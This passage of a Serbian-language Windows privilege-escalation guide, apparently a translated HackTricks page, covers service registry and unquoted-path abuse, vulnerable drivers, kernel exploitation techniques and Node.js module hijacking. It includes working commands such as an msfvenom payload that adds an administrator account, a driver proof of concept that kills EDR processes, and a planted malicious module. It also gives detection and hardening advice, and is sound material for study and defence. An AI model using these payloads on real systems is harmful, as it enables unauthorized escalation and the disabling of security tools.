Primer alata (RegPwn BOF / samostalna verzija):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Dozvole AppendData/AddSubdirectory u registru servisa

Ako imate ovu dozvolu nad registrom, to znači da **možete da kreirate podregistre u njemu**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Neograđene putanje do servisa

Ako putanja do izvršne datoteke nije pod navodnicima, Windows će pokušati da izvrši svaku putanju koja se završava pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Izlistajte sve putanje servisa koje nisu pod navodnicima, izuzimajući one koje pripadaju ugrađenim Windows servisima:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete otkriti i iskoristiti** pomoću alata metasploit: `exploit/windows/local/trusted\_service\_path` Možete ručno da napravite binarnu datoteku servisa pomoću alata metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Radnje oporavka

Windows omogućava korisnicima da navedu radnje koje će se izvršiti ako usluga otkaže. Ova funkcija se može konfigurisati tako da upućuje na binarnu datoteku. Ako je moguće zameniti tu datoteku, eskalacija privilegija može biti moguća. Više detalja možete pronaći u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ciljne skripte zakazanih zadataka

Za omogućen zadatak koji pokreće `cmd.exe /c` sa `.bat` ili `.cmd` datotekom, proverite skriptu navedenu u **argumentima radnje**, kao i `cmd.exe`. Isto važi i za eksplicitni argument datoteke interpretera, kao što je PowerShell `-File`. Ako zakazana batch datoteka sadrži doslovni poziv PowerShell-u sa `-File`, proverite i ACL te navedene skripte; promenljive, uslovne izraze i ulančavanje komandi potrebno je ručno ispratiti. Skripta ili nadređeni direktorijum u koji pozivalac može da upisuje predstavljaju trag za izvršavanje između naloga samo ako se konfigurisani principal zadatka razlikuje od pozivaoca i zadatak zaista dođe do te radnje. ACL koji dozvoljava samo dodavanje može biti relevantan za skripte, ali raniji `exit` ili drugi tok kontrole mogu onemogućiti izvršavanje naknadno dodatih linija. Pre nego što tvrdite da je moguća eskalacija, potvrdite efektivne ACL-ove, [kontekst izvršavanja zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), radni direktorijum, okidač i pravila kontrole aplikacija. Popisivanje ne sme da menja skriptu niti da pokreće zadatak.

## Imenovani tokovi u dostupnim datotekama

Na NTFS-u, čitljiva datoteka može imati imenovani `:$DATA` tok čiji sadržaj nije prikazan u uobičajenom spisku direktorijuma. Za mali, relevantni skup dostupnih rezervnih kopija ili konfiguracionih datoteka, pregledajte **imena i veličine** tokova pre otvaranja bilo kakvog sadržaja; Windows ih prikazuje putem [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), a PowerShell putem [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Ime toka koje nagoveštava da sadrži tajnu predstavlja samo trag. Proverite efektivna prava čitanja datoteke, podršku sistema datoteka za tokove, da li tok sadrži upotrebljive akreditive i na koji se nalog oni zaista autentifikuju. Izbegavajte rekurzivno skeniranje tokova i ispisivanje njihovog sadržaja tokom rutinskog popisivanja.

## Ulazi pomoćnog programa Windows Driver Kit koji koristi zakazani zadatak

Opcioni Windows Driver Kit sadrži `StandaloneRunner.exe`, koji može da koristi datoteke `command.txt`, `reboot.rsf` i projekta `working\rsf.rsf` iz direktorijuma iz kog se pokreće. Zakazani zadatak ili usluga koja pokreće ovaj pomoćni program sa privilegovanim nalogom može da pretvori pristup za upis sa niskim privilegijama u te ulazne datoteke u izvršavanje komandi u kontekstu tog naloga, čak i kada je sama izvršna datoteka zaštićena. Potvrdite da postoji privilegovani potrošač i da se **obe** prateće datoteke mogu kreirati ili menjati; samo pronalaženje pomoćnog programa nije dovoljno.

Za zakazani zadatak proverite [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) njegove radnje i ACL-ove putanja do dve prateće datoteke. Ako zadatak ne navodi radni direktorijum, direktorijum izvršne datoteke predstavlja samo trag koji treba proveriti, a ne dokaz gde zadatak čita ulaze. Takođe mora biti ispunjen preduslov za projektну radnu datoteku. Proverite stvarni principal zadatka umesto da pretpostavite da se izvršava kao SYSTEM.

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole nad binarnim datotekama** (možda možete da prepišete neku od njih i eskalirate privilegije) i **direktorijumima** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Putanja za popravku Windows agenta Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) utiče na starije Windows agente Checkmk koji su upisivali komandne datoteke u `C:\Windows\Temp`, a zatim izvršavali postojeću datoteku zaštićenu od upisa kada zamena ne bi uspela. Dobavljač je ispravio problem u verzijama 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Proverite punu instaliranu verziju zakrpe i da li se može pokrenuti operacija pogođenog agenta; oznaka grane kao što je `2.1` ne može da utvrdi da li je sistem izložen. Enumeracija može da proveri verziju, stanje servisa i dozvole za Temp bez kreiranja datoteka ili pokretanja komandi agenta.

#### Pregled SAML servisa ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) pogađao je ADSelfService Plus build 6210 i starije verzije; dobavljač je ispravio problem u buildu 6211. Relevantan je samo ako je SAML SSO **omogućen ili je ranije bio omogućen**. Stavka instaliranog proizvoda ili putanja servisa zato je trag, a ne potvrda ranjivosti: potvrdite tačan build, istoriju SAML konfiguracije, dostupnost servisa preko mreže i nalog pod kojim se pokreće. Izvršavanje koda kroz servis nasleđuje privilegije tog naloga; izvršavanje kao SYSTEM zahteva instancu pokrenutu kao SYSTEM. Čitljiva datoteka `OfflineBackup_*.ezip` u direktorijumu Backup proizvoda zaseban je trag šifrovane rezervne kopije, a ne dokaz upotrebljivih akreditiva ili ove SAML ranjivosti. Tokom rutinske enumeracije zabeležite njenu putanju i prava pristupa, ali je nemojte raspakovati.

#### Granice kontrolera Jenkins i domenskog naloga

Na Windows kontroleru Jenkins razlikujte dozvolu za kreiranje ili konfigurisanje posla od dozvole za njegovo pokretanje: [Jenkins ih dokumentuje kao zasebna prava `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Konfigurisani raspored ili udaljeni okidač mogu da pruže dodatni način pokretanja build-a, ali potvrdite da je omogućen i da se build zaista izvršava. Izvršavanje koristi identitet kontrolera ili izabranog agenta, a sačuvani akreditiv može da se koristi samo ako posao može da pristupi njegovom opsegu. Zasebno proverite pristup metapodacima u `JENKINS_HOME`: Jenkins čuva materijal akreditiva i ključeve za šifrovanje u datotekama `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([Jenkins skladištenje tajni](https://www.jenkins.io/doc/developer/security/secrets/)). Njihovo prisustvo samo po sebi ne otkriva lozinku; proverite **pristup za čitanje potrebnih datoteka** i zaseban put ponovne upotrebe naloga, bez ispisivanja tajni u deljenom izlazu. Ako taj nalog ima pravo upisa u `scriptPath` AD korisničkog objekta, potvrdite da je putanja skripte upisiva i da postoji stvarna prijava ili zakazani proces koji je koristi i radi kao ciljni korisnik, pre nego što to smatrate izvršavanjem kao drugi korisnik. Dodatnu kontrolu nad grupama treba potvrditi zasebnom proverom efektivnih AD prava.

#### Identitet self-hosted agenta Azure Pipelines

Za projekat Azure DevOps Server ili Azure Pipelines razlikujte dozvolu za **kreiranje ili izmenu** pipeline-a od dozvole za njegovo **stavljanje u red** i korišćenje izabranog pula agenata; [Microsoft zasebno dokumentuje dozvole za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) i [autorizaciju pula](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Ako nalog sa nižim privilegijama može da pošalje skriptni korak i pokrene taj pipeline na self-hosted Windows agentu, korak se izvršava kao [konfigurisani nalog operativnog sistema agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Pre nego što tvrdite da dolazi do prelaska na drugog korisnika ili SYSTEM, proverite tačan pipeline, ograničenja grane/resursa, autorizovani pool, posao koji može da se pokrene i identitet servisnog naloga agenta. Instalirani agent, uloga u projektu ili dozvola za upis u repozitorijum sami po sebi su samo trag; tokom pasivne enumeracije pregledajte dozvole i lokalne metapodatke servisa bez pokretanja build-a.

#### Akreditivi za Microsoft Entra Connect Sync

[Microsoft pravi razliku](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) između **servisnog naloga ADSync**, koji pokreće servis sinhronizacije i pristupa njegovoj SQL bazi podataka, i **naloga AD DS konektora**, čije dozvole u direktorijumu zavise od konfigurisane funkcionalnosti sinhronizacije. Akreditivi konektora čuvaju se šifrovani u toj bazi podataka, a ključni materijal je [zaštićen pomoću DPAPI pod servisnim nalogom ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Instalirani servis sinhronizacije, grupa čiji naziv sugeriše lokalne administratorske privilegije ili sam pristup bazi podataka ne dokazuju da postoje akreditivi koje je moguće dešifrovati niti da je moguća eskalacija na domenski nivo. Zasebno proverite stvarna prava čitanja baze podataka, pristup servisnom nalogu i ključu, raspored instalacije i SQL-a, konfigurisani identitet konektora i efektivne AD privilegije tog identiteta. Rutinska enumeracija treba da prikazuje samo metapodatke o servisu i pristupu, a ne da upituje ili ispisuje sačuvane tajne.

#### Dozvole za DLL-ove podrške upravljačkog programa štampača

Instalirani upravljački program štampača može da čuva DLL-ove podrške u `C:\ProgramData` i da ih učitava u privilegovanijem procesu štampanja. Proverite tačan direktorijum upravljačkog programa i ACL-ove DLL-ova, uključujući nadređene direktorijume i reparse points, čak i ako je enumeracija štampača preko WMI-ja zabranjena. Za [problem upravljačkog programa štampača Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), navedena putanja bila je `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [originalno obelodanjivanje](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje učitavanje DLL-ova pomoću `PrintIsolationHost.exe`. ACL koji dozvoljava upis samo je trag: proverite efektivni pristup za upis nakon primene deny unosa, da li je relevantni upravljački program instaliran i učitava li datoteku pod privilegovanim identitetom, kao i da li su dobavljačev ažurirani upravljački program ili bezbednosni program ispravili instalaciju. Nemojte zaključivati da postoji ranjivost samo na osnovu naziva direktorijuma ili verzije upravljačkog programa.

### Dozvole za upis

Proverite da li možete da izmenite neku konfiguracionu datoteku kako biste pročitali neku posebnu datoteku ili da li možete da izmenite binarnu datoteku koju će izvršiti nalog Administratora (schedtasks).

Slabe dozvole za direktorijume/datoteke u sistemu možete da pronađete ovako:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Učitavanje Notepad++ pluginova pri pokretanju i postojanost/izvršavanje

Notepad++ automatski učitava sve DLL-ove pluginova u potfolderima `plugins`. Ako postoji prenosiva instalacija ili kopija u koju može da se upisuje, ubacivanje zlonamernog plugina omogućava automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući i iz `DllMain` i povratnih poziva plugina).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri startu

**Proverite da li možete da prepišete neki registar ili binarnu datoteku koju će izvršiti drugi korisnik.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **lokacijama za automatsko pokretanje radi eskalacije privilegija**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **neobične/r ranjive drajvere trećih strana**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ako driver izlaže primitivu za proizvoljno čitanje/pisanje u kernelu (što je često slučaj kod loše osmišljenih IOCTL handlera), možete eskalirati privilegije tako što ćete direktno ukrasti SYSTEM token iz kernel memorije.<sup>[[13]](#references)</sup> Pogledajte tehniku korak po korak ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Povezani materijali o Windows kernel exploitation-u:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kod race-condition grešaka u kojima ranjivi poziv otvara Object Manager putanju pod kontrolom napadača, namerno usporavanje pretrage (korišćenjem komponenti maksimalne dužine ili dubokih lanaca direktorijuma) može da produži vremenski prozor sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF u cancel-safe queue, otkrivanje podataka iz paged-pool-a i I/O ring pivoti

Neki Windows kernel LPE lanci mogu se sastaviti od dve zasebno slabe greške: **race condition-a u životnom veku cancel-safe queue-a** koji oslobađa zahtev/CBD dok je zaključavanje reda i dalje aktivno, i otkrivanja podataka usled **otpuštanja zaključavanja pre kopiranja** koje otkriva oslobođenu alokaciju iz paged-pool-a tokom `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Beleške o analizi i eksploataciji:

- **Oslobađanje podataka pod zaključavanjem + naknadno otkazivanje**: tražite putanju uspeha koja radi **Acquire -> CompleteRequest/free -> Release**, dok putanja otkazivanja radi **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ako putanja uspeha stigne do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre otpuštanja CBDQ/CSQ zaključavanja, nit blokirana u `NtCancelIoFileEx -> IopCsqCancelRoutine` može kasnije da nastavi i prosledi oslobođeni `PFLT_CALLBACK_DATA` nazad u callback driver-a za uklanjanje iz reda.
- **Ponovo iskoristite oslobođeni objekat reda** alokacijom iz paged-pool-a iste veličine pod kontrolom napadača. `NPFS` Data Queue Entries su korisni jer se sadržaj i veličina mogu kontrolisati, a kasnije ih možete ispitati pomoću pipe read/peek operacija. Ako oslobođeni objekat sadrži linkove liste, prepišite ih **cikličnom listom lažnih request čvorova u korisničkoj memoriji**, tako da driver više puta obrađuje strukture zahteva koje definiše napadač, umesto da se zaustavi na originalnoj glavi liste.
- **Unapredite predvidljivo upisivanje**: ako lažni zahtev preusmeri ugnježdeni context pointer koji se koristi za upisivanje podataka za evidenciju (vremenske oznake / QPC / polja susedna refcount-u), možda ćete dobiti upis u kernel memoriju čija je **adresa pod vašom kontrolom, ali ne i vrednost**. U tom slučaju, ciljajte polje **length/size** objekta iz pool spray-a umesto konačnog code/data pointer-a, a zatim prođite kroz objekte u spray-u dok oštećeni objekat ne omogući **čitanje iz paged-pool-a van granica**.
- **Obrazac otkrivanja podataka podložan race condition-u**: svaki syscall koji radi `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` dobar je kandidat. Pouzdanost se poboljšava kada napadač može da poveća bafer koji se kopira (na primer, dodavanjem mnogo stavki liste/resursa koje povećavaju konačnu veličinu alokacije serializer-a), jer duže kopiranje proširuje prozor za zamenu, a da pritom ne mora da sruši sistem.
- **Ciljevi za dopunu bogati pointer-ima**: registrovani baferi u Windows **I/O ring-u** odlični su ciljevi za otkrivanje podataka jer se veličina njihove alokacije iz paged-pool-a može kontrolisati (`8 * regBufferCnt`), a svaki element je kernel pointer na `_IOP_MC_BUFFER_ENTRY`. Otkrijte jedan od ovih nizova, pronađite okolni `IORING_OBJECT`, a zatim oštetite **`RegBuffers`** i **`RegBuffersCount`** tako da naredne I/O ring operacije koriste lažirane stavke koje je napravio napadač i omoguće proizvoljno čitanje/pisanje u kernelu. Ako vam je dostupan samo upis stabilnog bajta (na primer, iz `KUSER_SHARED_DATA+0x14`), koristite **preklapajuće neporavnate upise** da biste napravili korisnički pointer sa ponovljenim bajtom, kao što je `0x0101010101010101`, mapirajte ga pomoću `VirtualAlloc` i tamo smestite lažni niz registrovanih bafera.<sup>[[30]](#references)</sup>

Korisni indikatori za debagovanje:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Kada iz oštećenog I/O ring-a dobijete proizvoljno čitanje/upisivanje u kernel, ukradite SYSTEM token standardnim postupkom nakon dobijanja primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitive za oštećenje memorije registry hive-a

Savremene ranjivosti hive-ova omogućavaju pripremu determinističkih rasporeda, zloupotrebu upisivih potomaka HKLM/HKU i pretvaranje oštećenja metapodataka u prekoračenja kernel paged-pool-a bez prilagođenog drajvera. Ceo lanac je opisan ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Zbrka tipova u direktnom režimu `RtlQueryRegistryValues` usled putanja koje kontroliše napadač

Neki drajveri prihvataju putanju registry-ja iz userland-a, proveravaju samo da li je ispravna UTF-16 niska, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` i odredištem u skalaru na steku, kao što je `int readValue`. Ako nedostaje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se tumači prema **stvarnom** tipu registry-ja, a ne prema tipu koji je programer očekivao.

Ovo omogućava dve korisne primitive:<sup>[[24]](#references)[[25]](#references)</sup>

- **Zbunjeni posrednik / oracle**: apsolutna putanja `\Registry\...` koju kontroliše korisnik omogućava drajveru da upituje ključeve koje je izabrao napadač, otkrije njihovo postojanje putem povratnih kodova/evidencija, a ponekad i pročita vrednosti kojima pozivalac ne bi mogao direktno da pristupi.
- **Oštećenje kernel memorije**: odredište skalarnog tipa, kao što je `&readValue`, može usled zbrke tipova da se tretira kao `REG_QWORD`, `UNICODE_STRING` ili bafer binarnih podataka određene veličine, u zavisnosti od tipa vrednosti registry-ja.

Praktične napomene za eksploataciju:

- **Ublažavanje u Windows 8+**: ako upit pogodi **nepouzdani hive** sa `RTL_QUERY_REGISTRY_DIRECT`, ali bez `RTL_QUERY_REGISTRY_TYPECHECK`, pozivi iz kernela izazivaju pad sa greškom `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da bi ranjivost ostala iskoristiva, potražite **ključeve u pouzdanim sistemskim hive-ovima u koje napadač može da upisuje**, umesto da pripremate vrednosti pod `HKCU`.
- **Priprema u pouzdanom hive-u**: koristite NtObjectManager da nabrojite upisive potomke `\Registry\Machine`, a zatim ponovite skeniranje sa dupliranim tokenom **niskog integriteta** da biste pronašli ključeve dostupne iz konteksta sandbox-a:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direktan upis od 8 bajtova u `int` od 4 bajta oštećuje susedne podatke na steku i može delimično da prepiše obližnji pokazivač na callback/funkciju.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direktni režim očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita napadačev `REG_DWORD` u skalarni podatak na steku, a zatim isti bafer ponovo upotrebi za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što omogućava delimično kontrolisan upis u kernel.
- **`REG_BINARY`**: za velike binarne podatke, direktni režim tumači prvi `LONG` na adresi `EntryContext` kao veličinu bafera sa predznakom. Ako prethodno čitanje `REG_DWORD` ostavi negativnu vrednost koju kontroliše napadač u ponovo upotrebljenom skalarnom podatku, sledeći upit `REG_BINARY` kopira napadačeve bajtove direktno preko susednih slotova na steku, što je često najjednostavniji put do potpunog prepisivanja pokazivača na callback.

Snažan obrazac za traženje: **raznorodna čitanja iz registra u istu promenljivu na steku bez ponovne inicijalizacije**. Pretražite `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo korišćene pokazivače `EntryContext` i putanje koda u kojima prvo čitanje iz registra određuje da li će se obaviti drugo čitanje.

#### Zloupotreba nedostajućeg FILE_DEVICE_SECURE_OPEN na objektima uređaja (LPE + gašenje EDR-a)

Neki potpisani drajveri trećih strana kreiraju svoj objekat uređaja sa strogim SDDL-om pomoću IoCreateDeviceSecure, ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ove zastavice, bezbedni DACL se ne primenjuje kada se uređaj otvori preko putanje koja sadrži dodatnu komponentu. Zbog toga bilo koji neprivilegovani korisnik može da dobije handle koristeći putanju u imenskom prostoru kao što je:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz stvarnog slučaja)

Kada korisnik može da otvori uređaj, privilegovani IOCTL-ovi koje drajver izlaže mogu da se zloupotrebe za LPE i neovlašćene izmene. Primeri mogućnosti zabeleženih u praksi:
- Vraćanje handle-ova sa punim pristupom proizvoljnim procesima (krađa tokena / SYSTEM shell preko DuplicateTokenEx/CreateProcessAsUser).
- Neograničeno čitanje/upisivanje na sirovi disk (neovlašćene izmene van mreže, trikovi za postojanost pri pokretanju sistema).
- Prekidanje proizvoljnih procesa, uključujući Protected Process/Light (PP/PPL), што омогућава gašenje AV-a/EDR-a iz user land-a preko kernela.

Minimalni obrazac PoC-a (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigacije za programere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja objekata uređaja koji treba da budu ograničeni pomoću DACL-a.
- Proverite kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre dozvoljavanja prekida procesa ili vraćanja handle-ova.
- Ograničite IOCTL-ove (maske pristupa, METHOD_*, validacija ulaza) i razmotrite modele sa brokerom umesto direktnih privilegija kernela.

Ideje za detekciju za odbranu
- Nadgledajte otvaranja sumnjivih naziva uređaja iz user-mode-a (npr. \\ .\\amsdk*) i određene sekvence IOCTL-ova koje ukazuju na zloupotrebu.
- Sprovodite Microsoftovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/zabranjenih.


## PATH DLL Hijacking

Ako imate **dozvole za pisanje u fascikli koja se nalazi u PATH-u**, možda ćete moći da otmete DLL koji učitava proces i **eskalirate privilegije**.<sup>[[2]](#references)</sup>

Proverite dozvole svih fascikli u PATH-u:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Za više informacija o tome kako zloupotrebiti ovu proveru:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking rezolucije Node.js / Electron modula putem `C:\node_modules`

Ovo je varijanta **Windows uncontrolled search path** koja pogađa aplikacije **Node.js** i **Electron** kada koriste uvoz bez putanje, kao što je `require("foo")`, a očekivani modul **nedostaje**.<sup>[[20]](#references)</sup>

Node traži pakete tako što prolazi naviše kroz stablo direktorijuma i proverava fascikle `node_modules` u svakom nadređenom direktorijumu. U Windowsu, ta pretraga može stići do korena diska. Zato aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može pokušati da pronađe:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **korisnik sa niskim privilegijama** može da kreira `C:\node_modules`, može da postavi zlonamerni `foo.js` (ili fasciklu paketa) i sačeka da **Node/Electron proces sa višim privilegijama** pokuša da pronađe nedostajuću zavisnost. Payload se izvršava u bezbednosnom kontekstu procesa žrtve, pa ovo predstavlja **LPE** kad god se cilj pokreće kao administrator, iz zakazanog zadatka sa povišenim privilegijama / omotača usluge ili iz privilegovane desktop aplikacije koja se automatski pokreće.

Ovo se naročito često dešava kada:

- je zavisnost navedena u `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka treće strane obavija `require("foo")` u `try/catch` i nastavlja rad u slučaju greške
- je paket uklonjen iz produkcionih verzija, izostavljen tokom pakovanja ili nije uspeo da se instalira
- se ranjivi `require()` nalazi duboko u stablu zavisnosti umesto u glavnom kodu aplikacije

### Pronalaženje ranjivih ciljeva

Koristite **Procmon** da potvrdite putanju rezolucije:<sup>[[23]](#references)</sup>

- Filtrirajte po `Process Name` = izvršna datoteka cilja (`node.exe`, EXE Electron aplikacije ili proces omotača)
- Filtrirajte po `Path` `contains` `node_modules`
- Usredsredite se na `NAME NOT FOUND` i poslednje uspešno otvaranje u okviru `C:\node_modules`

Korisni obrasci za pregled koda u raspakovanim `.asar` datotekama ili izvornom kodu aplikacije:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Eksploatacija

1. Identifikujte **naziv paketa koji nedostaje** pomoću Procmon-a ili pregleda izvornog koda.
2. Kreirajte root lookup direktorijum ako već ne postoji:

```powershell
mkdir C:\node_modules
```

3. Postavite modul pod tačno očekivanim nazivom:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul ne postoji, Node može da učita `C:\node_modules\foo.js`.

Stvarni primeri nedostajućih opcionih modula koji odgovaraju ovom obrascu uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je ono što se može ponovo koristiti: pronađite bilo koji **nedostajući bare import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za otkrivanje i ojačavanje bezbednosti

- Upozorite kada korisnik kreira `C:\node_modules` ili u njega upisuje nove `.js` fajlove/pakete.
- Potražite procese visokog integriteta koji čitaju iz `C:\node_modules\*`.
- U produkciji spakujte sve runtime zavisnosti i proverite upotrebu `optionalDependencies`.
- Pregledajte kod trećih strana u potrazi za obrascima `try { require("...") } catch {}` koji tiho ignorišu greške.
- Onemogućite opcione provere ako biblioteka to podržava (na primer, neke `ws` implementacije mogu da izbegnu zastarelu proveru `utf-8-validate` pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža
